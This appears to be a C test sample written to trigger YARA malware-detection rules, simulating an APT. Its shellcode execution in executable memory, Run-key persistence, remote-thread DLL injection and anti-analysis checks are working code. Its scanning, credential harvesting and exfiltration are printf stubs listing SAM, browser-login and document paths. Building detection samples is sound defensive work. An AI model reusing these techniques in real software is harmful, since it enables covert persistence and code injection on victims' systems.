/*
 * Advanced Persistent Threat (APT) Simulation
 * Test file for YARA rule detection
 * Contains patterns commonly found in APT malware
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Suspicious function names and patterns
typedef struct {
    char* c2_server;
    int port;
    char* encryption_key;
} CommandControlConfig;

// APT-like configuration
CommandControlConfig apt_config = {
    "apt-c2-server.darkweb.onion",
    443,
    "AES256_ADVANCED_ENCRYPTION_KEY_2025"
};

// Fileless malware techniques
void inject_shellcode() {
    unsigned char shellcode[] = 
        "\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff"
        "\x48\xbb\x19\x96\x12\x13\x14\x15\x16\x17\x48\x31\x58\x27\x48\x2d\xf8"
        "\xff\xff\xff\xe2\xf4\xe5\xde\x91\xf7\xe4\x5d\x56\x17\x19\x96\x52\x52";
    
    // VirtualAlloc for memory allocation
    LPVOID mem = VirtualAlloc(NULL, sizeof(shellcode), 
                             MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (mem) {
        memcpy(mem, shellcode, sizeof(shellcode));
        // Execute shellcode
        ((void(*)())mem)();
    }
}

// Registry persistence mechanism
void establish_registry_persistence() {
    HKEY hKey;
    char* malware_path = "C:\\Windows\\System32\\svchost.exe";
    
    // Create autorun registry entry
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, KEY_SET_VALUE, &hKey);
    
    RegSetValueEx(hKey, "WindowsSecurityUpdate", 0, REG_SZ, 
                 (BYTE*)malware_path, strlen(malware_path));
    
    RegCloseKey(hKey);
}

// Process injection techniques
void dll_injection(DWORD target_pid) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
    
    if (hProcess) {
        char dll_path[] = "C:\\Windows\\System32\\evil.dll";
        
        LPVOID remote_memory = VirtualAllocEx(hProcess, NULL, strlen(dll_path),
                                            MEM_COMMIT, PAGE_READWRITE);
        
        WriteProcessMemory(hProcess, remote_memory, dll_path, 
                          strlen(dll_path), NULL);
        
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                          (LPTHREAD_START_ROUTINE)LoadLibraryA,
                                          remote_memory, 0, NULL);
        
        CloseHandle(hThread);
        CloseHandle(hProcess);
    }
}

// Network reconnaissance
void network_scan() {
    char* target_networks[] = {
        "192.168.1.0/24",
        "10.0.0.0/8",
        "172.16.0.0/12"
    };
    
    // Port scanning simulation
    int common_ports[] = {21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995};
    
    printf("Starting network reconnaissance...\n");
    
    for (int i = 0; i < sizeof(target_networks)/sizeof(char*); i++) {
        printf("Scanning network: %s\n", target_networks[i]);
        
        for (int j = 0; j < sizeof(common_ports)/sizeof(int); j++) {
            printf("Checking port %d...\n", common_ports[j]);
            // Socket connection simulation
        }
    }
}

// Data exfiltration
void exfiltrate_data() {
    char* sensitive_files[] = {
        "C:\\Users\\*\\Documents\\*.pdf",
        "C:\\Users\\*\\Desktop\\*.doc",
        "C:\\Users\\*\\Downloads\\*.xls",
        "C:\\Windows\\System32\\config\\SAM",
        "C:\\Windows\\System32\\config\\SYSTEM"
    };
    
    // Collect system information
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    
    // Get computer name
    char computer_name[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computer_name);
    GetComputerNameA(computer_name, &size);
    
    // Get username
    char username[UNLEN + 1];
    DWORD user_size = sizeof(username);
    GetUserNameA(username, &user_size);
    
    printf("Exfiltrating data from: %s\\%s\n", computer_name, username);
    
    // Compress and encrypt data
    for (int i = 0; i < sizeof(sensitive_files)/sizeof(char*); i++) {
        printf("Collecting: %s\n", sensitive_files[i]);
    }
}

// Credential harvesting
void harvest_credentials() {
    // Browser credential paths
    char* credential_paths[] = {
        "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data",
        "%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles\\*.default\\logins.json",
        "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Login Data",
        "%APPDATA%\\Opera Software\\Opera Stable\\Login Data"
    };
    
    // Windows credential store
    printf("Accessing Windows Credential Manager...\n");
    
    // LSASS memory dump simulation
    printf("Attempting LSASS memory access...\n");
    
    // Registry credential locations
    char* registry_paths[] = {
        "HKLM\\SAM\\SAM\\Domains\\Account\\Users",
        "HKLM\\SECURITY\\Policy\\Secrets",
        "HKCU\\Software\\Microsoft\\Protected Storage System Provider"
    };
    
    for (int i = 0; i < sizeof(credential_paths)/sizeof(char*); i++) {
        printf("Harvesting from: %s\n", credential_paths[i]);
    }
}

// Anti-analysis techniques
void evasion_techniques() {
    // VM detection
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Services\\VBoxService", 
                     0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        printf("VirtualBox detected - exiting\n");
        exit(1);
    }
    
    // Debugger detection
    if (IsDebuggerPresent()) {
        printf("Debugger detected - exiting\n");
        exit(1);
    }
    
    // Sleep to evade sandboxes
    Sleep(60000); // 1 minute
    
    // Process name check
    char process_name[MAX_PATH];
    GetModuleFileNameA(NULL, process_name, MAX_PATH);
    
    if (strstr(process_name, "sample") || strstr(process_name, "malware")) {
        exit(1);
    }
}

int main() {
    printf("=== APT SIMULATION STARTED ===\n");
    printf("This is a test file for advanced threat detection\n");
    
    // Initialize evasion
    evasion_techniques();
    
    // Establish persistence
    establish_registry_persistence();
    
    // Perform reconnaissance
    network_scan();
    
    // Inject code
    inject_shellcode();
    
    // Harvest credentials
    harvest_credentials();
    
    // Exfiltrate data
    exfiltrate_data();
    
    printf("=== APT SIMULATION COMPLETED ===\n");
    
    return 0;
}
